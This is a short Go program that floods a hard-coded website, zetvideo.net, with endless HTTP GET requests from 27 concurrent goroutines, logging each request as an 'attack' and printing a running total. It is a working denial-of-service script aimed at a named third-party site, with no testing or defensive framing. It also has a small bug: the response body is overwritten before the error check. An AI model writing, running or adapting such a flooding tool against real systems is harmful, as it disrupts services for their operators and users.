package main

import (
	"io"
	"log"
	"fmt"
	"time"
	"strings"
	"net/http"
)

// Definitions of error codes used throughout the
// program. It is a three digit code that can be
// used to diagnose issues in case the program
// crashes.
const (
	ok = iota + 99  // no error.
	noRequest       // cannot make request to server.
)

var totalAttacks uint

func main() {
	const URL string = "https://zetvideo.net"

	go attack(URL, 0)
	go attack(URL, 1)
	go attack(URL, 2)
	go attack(URL, 3)
	go attack(URL, 4)
	go attack(URL, 5)
	go attack(URL, 6)
	go attack(URL, 7)
	go attack(URL, 8)
	go attack(URL, 9)
	go attack(URL, 10)
	go attack(URL, 11)
	go attack(URL, 12)
	go attack(URL, 13)
	go attack(URL, 14)
	go attack(URL, 15)
	go attack(URL, 16)
	go attack(URL, 17)
	go attack(URL, 18)
	go attack(URL, 19)
  go attack(URL, 20)
  go attack(URL, 21)
  go attack(URL, 22)
  go attack(URL, 23)
  go attack(URL, 24)
  go attack(URL, 25)
  go attack(URL, 26)

	for {
		time.Sleep(time.Second * 10)
		fmt.Println("---", totalAttacks, "ACHIEVED ---")
	}
}

// ! This is a never-ending loop.
func attack(URL string, index uint8) {
	var count uint
	for {
		handler(request(URL))
		log.Printf("[THREAD %03d] Attack %d on %s\n", index, count, URL)
		count++
		totalAttacks++
	}
}

func request(url string) int {
	var client = http.Client{
    	Timeout: time.Minute,
	}
	
	resp, err := client.Get(url)
	resp.Body = io.NopCloser(strings.NewReader(""))
	defer resp.Body.Close()
	if err != nil {
		return noRequest
	}
	return ok
}

func handler(_err int) {
	switch _err {
		case noRequest:
			log.Fatalln("error ", noRequest, "cannot make request to server.")
		default:
			return
	}
}
